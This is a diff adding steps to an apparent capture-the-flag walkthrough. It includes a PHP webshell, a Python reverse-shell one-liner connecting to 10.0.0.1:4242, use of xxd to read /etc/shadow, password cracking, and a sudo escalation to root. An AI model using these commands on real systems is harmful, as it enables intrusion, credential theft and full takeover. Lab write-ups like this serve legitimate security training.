@@ -11,4 +11,12 @@ nc -vn $ip $port
 ```
 3. Then one line php webshell `"<?php system($_GET['cmd']); ?>"`
 
-### Task 6
+### Task 6 What is the local user account password?
+1. First get a reverse shell from webshell. `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
+2. Run `Linpeas.sh` found the intersting file `xxd`. https://gtfobins.github.io/gtfobins/xxd/
+3. 
+```
+LFILE=/etc/shadow
+xxd "$LFILE" | xxd -r
+```
+4. Crack the password. `su user` the `sudo su` get the root
